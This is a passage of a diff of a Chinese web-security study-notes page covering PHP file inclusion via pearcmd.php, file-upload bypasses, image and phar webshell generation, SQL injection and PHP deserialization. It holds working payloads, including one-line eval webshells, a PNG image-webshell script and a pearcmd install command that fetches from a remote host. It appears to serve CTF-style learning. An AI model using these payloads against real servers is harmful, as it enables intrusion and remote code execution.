 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/lib/php</span><span class="hljs-regexp">/pearcmd.php&amp;+install+-R+/tmp</span>+<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/xxx/</span><br></code></pre></td></tr></table></figure>
-<ol start="3" type="1">
-<li><figure>
-<img src="/2024/12/03/Web/1733230982721.png" srcset="/img/loading.gif" lazyload alt="1733230982721">
-<figcaption aria-hidden="true">1733230982721</figcaption>
-</figure></li>
+<ol start="3">
+<li><img src="/2024/12/03/Web/1733230982721.png" srcset="/img/loading.gif" lazyload alt="1733230982721"></li>
 </ol>
 <p>生成临时文件，里面含有配置项加内容。<code>-c</code>指定文件保存路径，<code>-d</code>写配置项内容，<code>-s</code>保存</p>
 <p>payload:</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>php<span class="hljs-regexp">/pearcmd.php&amp;+-c+/</span>tmp/<span class="hljs-number">1</span>.php+-d+man_dir=&lt;?=<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];?&gt;+-s<br></code></pre></td></tr></table></figure>
 <p>可以参考：</p>
-<p>https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x05-segfaulttemp</p>
-<p>https://blog.csdn.net/Mrs_H/article/details/122386511里面的思考</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x05-segfaulttemp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x05-segfaulttemp</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mrs_H/article/details/122386511%E9%87%8C%E9%9D%A2%E7%9A%84%E6%80%9D%E8%80%83">https://blog.csdn.net/Mrs_H/article/details/122386511里面的思考</a></p>
 <h2 id="php文件上传">php文件上传</h2>
 <h3 id="强制文件上传机制">强制文件上传机制</h3>
 <p>POST上传文件到指定目录时，除了生成临时文件外，上传文件的信息存储在该文件的全局变量$_FILE（二维数组）中，键名（二维数组索引）为文件上传表单设定的名称,如<input name="file" type="xx">中的file。</p>
@@ -812,12 +787,12 @@ Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
 <ul>
 <li>利用move_upload_file(原目录，指定目录)来实现真正上传</li>
 </ul>
-<p>例如：move_upload_file(<span class="math inline">\(file[&#39;tmp_name&#39;],&quot;/upload/&quot;.\)</span>file['name']);</p>
+<p>例如：move_upload_file($file[‘tmp_name’],“/upload/”.$file[‘name’]);</p>
 <h3 id="文件上传绕过">文件上传绕过</h3>
 <h4 id="替换xx为空">替换xx为空</h4>
 <p>例如替换php为空，可以采用双写绕过，xx.pphphp =&gt; xx.php</p>
 <p>也可以采用php3、php5、phps、phtml等</p>
-<h4 id="截取">%00截取</h4>
+<h4 id="00截取">%00截取</h4>
 <p>%00视为字符串的结尾；</p>
 <p>例如：123.php%00.jpg；在判断上传文件类型时，识别最后一个后缀为jpg；而在写文件上传路径时，由于%00截断的存在，只写入123.php。</p>
 <p>适用版本：php版本低于5.3.4；java版本小于7u40</p>
@@ -827,7 +802,7 @@ Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
 <p>例如：123.php%df.jpg =&gt; 123.php</p>
 <h4 id="文件后缀为白名单的绕过">文件后缀为白名单的绕过</h4>
 <p>基于web服务器的解析漏洞绕过：</p>
-<h5 id="iis">IIS</h5>
+<h5 id="IIS">IIS</h5>
 <p>windows自带的web服务器；</p>
 <p>如果解析的目录名字为<code>xxx.asp(类似php)</code>，该目录下的所有文件（无论什么后缀）均按照asp来解析;</p>
 <p>适用版本：IIS6.0(Windows XP/server 2003)。</p>
@@ -839,12 +814,11 @@ Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
 <li>多后缀解析漏洞</li>
 </ul>
 <p>当apache遇到不认识的后缀时，会继续往前找后缀，找到认识的后缀后解析执行</p>
-<p>例如：123.php.rs =&gt; 123.php</p>
+<p>例如：<a target="_blank" rel="noopener" href="http://123.php.rs">123.php.rs</a> =&gt; 123.php</p>
 <ul>
 <li>ImageMagic组件白名单绕过</li>
 </ul>
-<p>条件：ImageMagic版本小于等于3.3.0；php版本大于5.4；启用ImageMagic插件；通过php
-new ImageMagic 对象的方式来处理图片</p>
+<p>条件：ImageMagic版本小于等于3.3.0；php版本大于5.4；启用ImageMagic插件；通过php new ImageMagic 对象的方式来处理图片</p>
 <p>利用：上传特定的svg图片</p>
 <h3 id="高级文件绕过">高级文件绕过</h3>
 <h4 id="自定义配置文件上传">自定义配置文件上传</h4>
@@ -854,38 +828,45 @@ new ImageMagic 对象的方式来处理图片</p>
 <h4 id="服务端内容检测">服务端内容检测</h4>
 <p>二分法确认被检测的关键字，进行替换；</p>
 <p>可以利用$_COOKIE全局变量（过滤GET、POST、REQUEST）,由于cookie值中不能使用<code>;</code>，可以借助base64编码</p>
-<h4 id="配合伪协议日志文件来绕过">配合伪协议/日志文件来绕过</h4>
+<h4 id="配合伪协议-日志文件来绕过">配合伪协议/日志文件来绕过</h4>
 <p>如果找不到替换；</p>
 <p>可以采用伪协议来作为文件目录，例如：auto.append.file=php://input；在post中提交恶意代码</p>
 <p>可以采用日志文件来作为文件目录，例如：auto.append.file=/var/www/html/access.log；在User-Agent中提交恶意代码。</p>
-<h4 id="上传html文件来进行跨站脚本攻击xss">上传html文件来进行跨站脚本攻击（xss）</h4>
+<h4 id="上传html文件来进行跨站脚本攻击（xss）">上传html文件来进行跨站脚本攻击（xss）</h4>
 <p>待探索。</p>
 <h4 id="getimagesize函数绕过">getimagesize函数绕过</h4>
 <p>题目采用getimagesize()函数来检测是否为图片上传。</p>
 <p>利用XBM格式的图片，长宽高采用如下方式定义：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//define %s %d</span><br><span class="hljs-comment">#define width 1</span><br><span class="hljs-comment">#define height 1</span><br></code></pre></td></tr></table></figure>
 <p>利用，上传user.ini文件时加上上述两行，伪装为图片，绕过getimagesize检测。</p>
-<h4 id="pngjpg二次渲染绕过">PNG、JPG二次渲染绕过</h4>
+<h4 id="PNG、JPG二次渲染绕过">PNG、JPG二次渲染绕过</h4>
 <ul>
-<li><p>什么是二次渲染？
-目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的<code>imagecreatefromjpeg()</code>等函数），所以普通的图片马都难逃被渲染的悲剧。</p></li>
-<li><p>绕过</p>
+<li>
+<p>什么是二次渲染？<br>
+目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的<code>imagecreatefromjpeg()</code>等函数），所以普通的图片马都难逃被渲染的悲剧。</p>
+</li>
+<li>
+<p>绕过</p>
 <ul>
-<li><p>GIF</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">渲染前后的两张 GIF，没有发生变化的数据块部分直接插入 Webshell 即可<br></code></pre></td></tr></table></figure></li>
-<li><p>PNG</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">PNG</span> 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块<br></code></pre></td></tr></table></figure></li>
-<li><p>JPG</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">JPG </span>需要使用脚本将数据插入到特定的数据块，而且可能会不成功，所以需要多次尝试 <br></code></pre></td></tr></table></figure></li>
-</ul></li>
+<li>
+<p>GIF</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">渲染前后的两张 GIF，没有发生变化的数据块部分直接插入 Webshell 即可<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>PNG</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">PNG</span> 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>JPG</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">JPG </span>需要使用脚本将数据插入到特定的数据块，而且可能会不成功，所以需要多次尝试 <br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
 </ul>
 <p>以下是通过写IDAT数据块生成图片马的脚本：（PNG二次渲染绕过）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;2.png&#x27;</span>);  <span class="hljs-comment">//要修改的图片的路径</span><br></code></pre></td></tr></table></figure>
 <p>对生成的图片进行分析：</p>
-<figure>
-<img src="/2024/12/03/Web/1733881606748.png" srcset="/img/loading.gif" lazyload alt="1733881606748">
-<figcaption aria-hidden="true">1733881606748</figcaption>
-</figure>
+<p><img src="/2024/12/03/Web/1733881606748.png" srcset="/img/loading.gif" lazyload alt="1733881606748"></p>
 <p>成功写入payload，需要有文件包含点（例如查看上传的图片），传参两个变量即可，这里通常需要抓包查看回显，浏览器无法直接渲染回显信息。</p>
 <p>以下是JPG二次渲染绕过的图片马生成的脚本：</p>
 <p>由于jpg图片易损，对图片的选取有很高要求，很容易制作失败，需要多次尝试：</p>
@@ -894,30 +875,26 @@ new ImageMagic 对象的方式来处理图片</p>
 <p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>2.jpg</code>；</p>
 <p>执行命令<code>php jpg_payload.php 1.jpg</code>，生成图片马</p>
 <p>其余同上。</p>
-<p>参考：https://www.cnblogs.com/1ink/p/15115240.html</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1ink/p/15115240.html">https://www.cnblogs.com/1ink/p/15115240.html</a></p>
 <h4 id="phar文件上传绕过">phar文件上传绕过</h4>
 <h5 id="phar协议">phar协议</h5>
-<p>phar://、zip://、bzip2://、zlib://，用于读取压缩文件，均属于压缩流，可以访问压缩文件中的子文件，可以任意修改phar包的后缀为：<code>jpg png gif xxx</code>
-等等。</p>
+<p>phar://、zip://、bzip2://、zlib://，用于读取压缩文件，均属于压缩流，可以访问压缩文件中的子文件，可以任意修改phar包的后缀为：<code>jpg png gif xxx</code> 等等。</p>
 <h5 id="生成phar包">生成phar包</h5>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span> ;<span class="hljs-comment">//一句话木马</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;example.phar&quot;</span>); <span class="hljs-comment">//这里为生成的phar包名称，后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;phar.php&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$payload</span>&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">// $phar-&gt;setMetadata(...); //在metadata添加内容，可参考 phar反序列化，此处用不着，故注释</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>这里需要修改php配置文件中的<code>readonly</code>项为off，才可以生成phar包，需要去掉前面默认的<code>;</code>。</p>
 <p>结果如下图：</p>
 <p>生成example.phar文件，里面包含压缩的phar.php文件，文件写有一句话木马。</p>
-<figure>
-<img src="/2024/12/03/Web/1733886458034.png" srcset="/img/loading.gif" lazyload alt="1733886458034">
-<figcaption aria-hidden="true">1733886458034</figcaption>
-</figure>
+<p><img src="/2024/12/03/Web/1733886458034.png" srcset="/img/loading.gif" lazyload alt="1733886458034"></p>
 <p>修改后缀为.zip实现文件上传。</p>
 <p>有文件包含点：</p>
 <p>访问上传的路径：phar://xxx.zip/phar，传参，即可实现RCE。</p>
 <p>参考：</p>
-<p>https://blog.csdn.net/Leaf_initial/article/details/130152577?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-130152577-blog-134741062.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-130152577-blog-134741062.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;utm_relevant_index=1</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Leaf_initial/article/details/130152577?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-130152577-blog-134741062.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-130152577-blog-134741062.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;utm_relevant_index=1">https://blog.csdn.net/Leaf_initial/article/details/130152577?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-130152577-blog-134741062.235^v43^pc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-130152577-blog-134741062.235^v43^pc_blog_bottom_relevance_base2&amp;utm_relevant_index=1</a></p>
 <h2 id="sql注入">sql注入</h2>
 <h3 id="常用sql语句">常用sql语句</h3>
 <p>CURD：create、update、read、delete增删改查操作</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">查：select username,password from user;<br>删：delete from user where username = &#x27;hello&#x27;;<br>插：insert into user (username,password) values (&#x27;hello&#x27;,&#x27;world&#x27;);<br>改：update user set password=&#x27;world!&#x27; where username = &#x27;hello&#x27;;<br></code></pre></td></tr></table></figure>
-<h3 id="phpsql">php+sql</h3>
+<h3 id="php-sql">php+sql</h3>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#连接：</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$db</span>,<span class="hljs-variable">$port</span>);<br><span class="hljs-comment">#使用：</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(sql语句);<br><span class="hljs-comment">#返回结果：</span><br><span class="hljs-comment">#所有：$result-&gt;fetch_all();</span><br><span class="hljs-comment">#一行：$result-&gt;fetch_array();</span><br></code></pre></td></tr></table></figure>
 <h3 id="联合查询">联合查询</h3>
 <h4 id="数字型">数字型</h4>
@@ -948,8 +925,7 @@ new ImageMagic 对象的方式来处理图片</p>
 <p>利用<code>updatexml()</code>函数带出报错信息：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">username = a&#x27; or updatexml(1,contact(&#x27;~&#x27;,(select user()),&#x27;~&#x27;),1)%23<br></code></pre></td></tr></table></figure>
 <p>其余可用函数：</p>
-<p>extractvalue；（exp,pow,cot）整数溢出报错；不存在的函数名查库名，e.g.
-select a()等</p>
+<p>extractvalue；（exp,pow,cot）整数溢出报错；不存在的函数名查库名，e.g. select a()等</p>
 <h3 id="堆叠注入">堆叠注入</h3>
 <p>通过<code>;</code>，执行多条sql语句，需后台支持。</p>
 <p>如果可以堆叠，优先考虑存储过程：e.g.绕过select过滤</p>
@@ -974,8 +950,8 @@ select a()等</p>
 <ul>
 <li>get_lock()函数</li>
 </ul>
-<p>select get_lock('a',3);</p>
-<p>再次使用字符串'a'会造成延时效果，但只针对数据库连接的长连接，php一般解释执行完sql语句后就会关闭数据库连接，而java是维护数据库连接池的长时间连接。</p>
+<p>select get_lock(‘a’,3);</p>
+<p>再次使用字符串’a’会造成延时效果，但只针对数据库连接的长连接，php一般解释执行完sql语句后就会关闭数据库连接，而java是维护数据库连接池的长时间连接。</p>
 <ul>
 <li>rlike</li>
 </ul>
@@ -1003,13 +979,13 @@ select a()等</p>
 <ul>
 <li>字符串表示数据时，可以转化为16进制使用</li>
 <li>同相同功能的函数替换：substr-&gt;substring</li>
-<li>数据读取转为数据写入：into outfile '/var/www/html/1.php'</li>
+<li>数据读取转为数据写入：into outfile ‘/var/www/html/1.php’</li>
 </ul>
 <h2 id="php反序列化">php反序列化</h2>
 <h3 id="类的属性">类的属性</h3>
 <ul>
-<li>public：外部对象可以通过"-&gt;"访问</li>
-<li>private：内部对象通过"this-&gt;"访问</li>
+<li>public：外部对象可以通过&quot;-&gt;&quot;访问</li>
+<li>private：内部对象通过&quot;this-&gt;&quot;访问</li>
 <li>protect：自身及其子类、父类可以访问</li>
 <li>static：每个对象中该值固定，不能被修改，可以通过类名直接调用<code>user::</code></li>
 </ul>
@@ -1041,10 +1017,10 @@ select a()等</p>
 <p>protect属性，系列化后，属性名为：%00+*+%00+属性名</p>
 <h3 id="反序列化unserialize">反序列化unserialize</h3>
 <p>将字符串变为可调用对象。</p>
-<p>e.g.<code>O:6:"animal":1:&#123;s:4:"name";N;&#125;</code></p>
+<p>e.g.<code>O:6:&quot;animal&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;</code></p>
 <p><code>O:对象,6:对象名长度,animal:对象名,1:属性个数,s:属性类型,4:属性名长度,name:属性名,N:属性值，为空</code></p>
 <p>反序列化流程：</p>
-<ol type="1">
+<ol>
 <li>找到反序列化的字符串中规定的类名字</li>
 <li>实例化这个类，但不通过构造函数</li>
 <li>属性赋值</li>
@@ -1058,33 +1034,33 @@ select a()等</p>
 <p>trait：不可以序列化，没有实例化对象；</p>
 <p>属性值可以是一个对象（套娃或者实现首尾相连）</p>
 <h3 id="魔术方法">魔术方法</h3>
-<h4 id="construct">__construct（）</h4>
+<h4 id="construct（）">__construct（）</h4>
 <p>只有实例化对象（new）时会自动调用，不能重复声明，可以通过该函数为私有属性赋值。</p>
 <h4 id="destruct">__destruct()</h4>
 <p>类对象将要销毁时（脚本运行完毕时）自动调用。</p>
 <p>类对象必须在代码中应用（new或者unserialize产生）；</p>
 <p>优先级大于die()和exit()；</p>
-<p>可以强制删除进程(windows)来绕过<code>system('taskkill /fi "imagename eq php.exe" /f')</code>，浏览器使用<code>php-cgi.exe</code>。</p>
+<p>可以强制删除进程(windows)来绕过<code>system('taskkill /fi &quot;imagename eq php.exe&quot; /f')</code>，浏览器使用<code>php-cgi.exe</code>。</p>
 <h4 id="sleep-和-wakeup">sleep() 和 wakeup()</h4>
 <p>序列化时自动调用sleep()，需要返回属性名；</p>
 <p>反序列化时自动调用wakeup()。</p>
-<h4 id="call和callstatic">call()和callstatic()</h4>
+<h4 id="call-和callstatic">call()和callstatic()</h4>
 <p>调用不存在的方法时，自动调用call()，例如<code>$tmp-&gt;nothing()</code>；</p>
 <p>调用不存在的静态方法时，自动调用callstatic()，例如<code>tmp::nothing()</code>。</p>
-<h4 id="getset和issetunset">get(),set()和isset(),unset()</h4>
+<h4 id="get-set-和isset-unset">get(),set()和isset(),unset()</h4>
 <p>get()：访问不存在的属性或者不可访问属性时，自动调用</p>
 <p>set()：赋值不存在的属性或者不可访问属性时，自动调用</p>
 <p>isset()：使用isset函数访问不存在的属性或者不可访问属性时，自动调用</p>
 <p>unset：使用unset函数访问不存在的属性或者不可访问属性时，自动调用</p>
 <h4 id="tostring">tostring()</h4>
 <p>类实例与字符串拼接或者作为字符串引用时，自动调用。</p>
-<h4 id="invoke方法">invoke()方法</h4>
+<h4 id="invoke-方法">invoke()方法</h4>
 <p>类实例被作为函数名执行时，自动调用。</p>
-<h4 id="set_state方法">__set_state()方法</h4>
+<h4 id="set-state-方法">__set_state()方法</h4>
 <p>var_export($a)返回变量结构信息，自动调用。</p>
-<h4 id="debuginfo方法">__debuginfo()方法</h4>
+<h4 id="debuginfo-方法">__debuginfo()方法</h4>
 <p>var_dump($a)打印变量信息时，自动调用。</p>
-<h4 id="clone方法">__clone()方法</h4>
+<h4 id="clone-方法">__clone()方法</h4>
 <p>使用clone复制一个对象，自动调用。</p>
 <h3 id="反序列化条件">反序列化条件</h3>
 <p>有反序列化字符串提交入口；</p>
@@ -1094,7 +1070,7 @@ select a()等</p>
 <h4 id="绕过wakeup方法">绕过wakeup方法</h4>
 <p>条件：php5-php5.6.25；php7-php7.0.10</p>
 <p>修改反序列化字符串中表示属性个数大于实际属性个数。</p>
-<h4 id="绕过o数字">绕过O：数字</h4>
+<h4 id="绕过O：数字">绕过O：数字</h4>
 <p>修改为<code>O：+(%2b)数字</code></p>
 <h4 id="绕过值相等">绕过值相等</h4>
 <p>使用<code>&amp;</code>，e.g.this-&gt;password=&amp;this-&gt;secret，在construct方法中，通过指向相同的地址来实现值相等。</p>
@@ -1108,7 +1084,7 @@ select a()等</p>
 <h4 id="phar反序列化">phar反序列化</h4>
 <h5 id="phar文件">phar文件</h5>
 <p>多个php文件合并为独立压缩包，不解压就能执行，支持web服务器和命令行</p>
-<h5 id="phar协议phar">phar协议：phar://</h5>
+<h5 id="phar协议：phar">phar协议：phar://</h5>
 <p>创建phar包</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phar</span>(<span class="hljs-string">&quot;name.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">buildFromDirectory</span>(_FILE_).<span class="hljs-string">&#x27;xxxx&#x27;</span>;  <span class="hljs-comment">#当前文件夹的xxxx</span><br>	<span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">createdefaultstub</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>)); <span class="hljs-comment">#将flag.php内容作为phar的index</span><br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setmetadata</span>(<span class="hljs-variable">$u</span>) <span class="hljs-comment">#phar中存入类实例，以反序列字符串的形式存放至phar文件中，使用phar协议加载phar文件时，会自动进行反序列化创建类对象</span><br>   <br></code></pre></td></tr></table></figure>
 <h5 id="使用phar协议的函数">使用phar协议的函数</h5>
@@ -1131,7 +1107,7 @@ select a()等</p>
 <p>a数组，s会话key内容，o元素类型</p>
 <p>在php_serialize页面的类中属性值传入xx|{反序列化字符串}的形式，在使用php处理器的页面中进行反序列化，会自动以|进行分隔，反序列传入的{反序列化字符串}。</p>
 <h2 id="php框架">php框架</h2>
-<h3 id="mvc结构设计思路">MVC结构设计思路</h3>
+<h3 id="MVC结构设计思路">MVC结构设计思路</h3>
 <p>M：模型，负责处理数据</p>
 <p>V： 视图，负责向control发送数据后显示出来</p>
 <p>C：控制器，负责分发请求</p>
@@ -1147,21 +1123,20 @@ select a()等</p>
 <li>从基于文件的url转为基于路由的url（关注文件-&gt;关注访问的参数）</li>
 <li>模型对用户透明</li>
 </ul>
-<h3 id="thinkphp框架的反序列化链">ThinkPHP框架的反序列化链</h3>
+<h3 id="ThinkPHP框架的反序列化链">ThinkPHP框架的反序列化链</h3>
 <h4 id="tp5">tp5</h4>
